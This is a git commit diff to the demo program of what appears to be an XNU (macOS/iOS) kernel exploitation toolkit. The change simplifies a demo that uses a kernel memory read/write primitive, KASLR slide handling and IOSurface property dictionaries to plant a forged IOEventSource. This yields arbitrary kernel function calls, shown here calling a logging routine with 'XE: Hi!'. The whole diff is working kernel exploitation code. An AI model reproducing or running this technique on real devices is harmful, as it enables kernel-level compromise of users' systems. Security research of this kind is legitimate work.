c8ae8d6d2aabcebaee749a057c6fbd187df32315
Sreejith Krishnan R <hello.sreejith@pm.me>
2022-01-11 07:29:03 -0800

    Better demo

--- kfunc/kfunc/main.c
+++ kfunc/kfunc/main.c
@@ -64,42 +64,35 @@ int main(int argc, const char* argv[]) {
     xe_kmem_use_backend(backend);
     xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
     
-    uintptr_t record_function = xe_slider_slide(0xfffffe0007aaba58);
+    uintptr_t record_function = xe_slider_slide(FUNC_OS_REPORT_WITH_BACKTRACE);
     
     uintptr_t proc = xe_xnu_proc_current_proc();
     
     xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_slide(VAR_ZONE_IO_EVENT_SOURCE)), 1);
     xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR), 128), 1);
     
-    xe_util_kfunc_basic_t util1 = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 1);
-    xe_util_kfunc_basic_t util2 = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 2);
+    xe_util_kfunc_basic_t kfunc = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 1);
     
-    for (int i=0; i<10; i++) {
-        uintptr_t io_event_source1 = xe_util_kfunc_build_event_source(util1, record_function);
-        uintptr_t io_event_source2 = xe_util_kfunc_build_event_source(util2, record_function);
-        
-        iokit_iosurface_allocator_t allocator;
-        int error = iokit_iosurface_allocator_create(&allocator);
-        xe_assert_err(error);
-        
-        size_t alloc_idx;
-        error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
-        xe_assert_err(error);
-        error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
-        xe_assert_err(error);
-        
-        uintptr_t surface;
-        error = xe_io_surface_scan_all_clients_for_prop("iosurface_alloc_1", &surface);
-        xe_assert_err(error);
-        
-        uintptr_t props = xe_kmem_read_uint64(KMEM_OFFSET(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET));
-        error = xe_io_os_dictionary_set_value_of_key(props, "iosurface_alloc_0", io_event_source1);
-        xe_assert_err(error);
-        error = xe_io_os_dictionary_set_value_of_key(props, "iosurface_alloc_1", io_event_source2);
-        xe_assert_err(error);
-        
-        iokit_iosurface_allocator_destroy(&allocator);
-        xe_util_kfunc_reset(util1);
-        xe_util_kfunc_reset(util2);
-    }
+    uintptr_t io_event_source = xe_util_kfunc_build_event_source(kfunc, record_function, "XE: Hi!");
+    
+    iokit_iosurface_allocator_t allocator;
+    int error = iokit_iosurface_allocator_create(&allocator);
+    xe_assert_err(error);
+    
+    size_t alloc_idx;
+    error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
+    xe_assert_err(error);
+    error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
+    xe_assert_err(error);
+    
+    uintptr_t surface;
+    error = xe_io_surface_scan_all_clients_for_prop("iosurface_alloc_1", &surface);
+    xe_assert_err(error);
+    
+    uintptr_t props = xe_kmem_read_uint64(KMEM_OFFSET(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET));
+    error = xe_io_os_dictionary_set_value_of_key(props, "iosurface_alloc_0", io_event_source);
+    xe_assert_err(error);
+    iokit_iosurface_allocator_destroy(&allocator);
+    xe_util_kfunc_reset(kfunc);
+    return 0;
 }
